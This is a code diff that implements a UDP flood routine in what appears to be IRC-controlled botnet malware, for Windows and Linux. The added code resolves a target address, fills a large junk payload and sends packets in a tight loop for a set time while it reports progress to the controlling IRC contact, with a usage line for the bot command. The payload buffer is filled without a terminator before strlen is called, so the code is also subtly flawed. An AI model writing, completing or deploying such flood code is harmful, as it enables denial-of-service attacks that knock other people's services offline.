@@ -28,11 +28,15 @@
 
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
+#define _WIN32_WINNT 0x501
+
+#include <ws2tcpip.h>
 #include <winsock2.h>
 #include <windows.h>
 
 #elif defined(__linux__)
 
+#include <netdb.h>
 #include <sys/socket.h>
 #include <pthread.h>
 // need other headers?
@@ -42,28 +46,81 @@
 #include "bot.h"
 
 /*
- * udp flood
+ * generic udp flood
  * max packet data
  * and send out as many
  * packets as possible
  */
 // usage: $udp -v [IPv4] -p [PORT] -h [THREADS] -t [TIME (s)]
+// NOT SURE IF WORKING, REQUIRES TESTING
+// NOT SURE IF WORKING, REQUIRES TESTING
+// NOT SURE IF WORKING, REQUIRES TESTING
+// NOT SURE IF WORKING, REQUIRES TESTING
+// NOT SURE IF WORKING, REQUIRES TESTING
+// NOT SURE IF WORKING, REQUIRES TESTING
+// NOT SURE IF WORKING, REQUIRES TESTING
 void *udp_flood (void *args) {
-    // todo
+    int err;
     char output[MAX_MSG_SIZE];
-    SOCKET s = ((thd_args *)args)->s;
-    
-    snprintf (output, sizeof (output), "PRIVMSG %s :UDP Flooding %s:%s with %d threads for %ds.\r\n", 
-                ((thd_args *)args)->contact, ((thd_args *)args)->addr, ((thd_args *)args)->port, 
-                ((thd_args *)args)->threads, ((thd_args *)args)->time);
-    send (s, output, strlen (output), 0);
+    char payload[65000];
+    thr_args *ta = (thr_args *)args;
+
+    // set up connection data
+    SOCKET target_s;
+    WSADATA wsa;
+    struct addrinfo hints, *res;
+    memset (&hints, 0, sizeof (hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_DGRAM;
 
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
+    if (WSAStartup (MAKEWORD (2, 2), &wsa)) {
+        return NULL;
+    }
+
+#endif
+
+    int gai = getaddrinfo (ta->addr, ta->port, &hints, &res);
+    if (gai) {
+        return NULL;
+    }
+    
+    target_s = socket (res->ai_family, res->ai_socktype, res->ai_protocol);
+    if (target_s == -1) {
+        return NULL;
+    }
+    
+    snprintf (output, sizeof (output), "PRIVMSG %s :UDP Flooding %s:%s with %d threads for %ds.\r\n", 
+                ta->contact, ta->addr, ta->port, 
+                ta->threads, ta->time);
+    send (ta->s, output, strlen (output), 0);
+
+    // payload data
+    memset (payload, 0x41, sizeof (payload)-1);
+    payload[strlen (payload)] = '\0';
+    int payload_len = strlen (payload);
+
+    int start_time = time (NULL);
+    while (time (NULL) - start_time < ta->time) {
+        err = sendto (target_s, payload, payload_len, 0, res->ai_addr, res->ai_addrlen);
+        if (err == -1) {
+            return NULL;
+        }
+    }
+
+    // clean up
+    freeaddrinfo (res);
+
+    shutdown (target_s, SD_BOTH);
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+    closesocket (target_s);
     ExitThread (0);
 
 #elif defined(__linux__)
 
+    close (target_s);
     pthread_exit (0);
 
 #endif
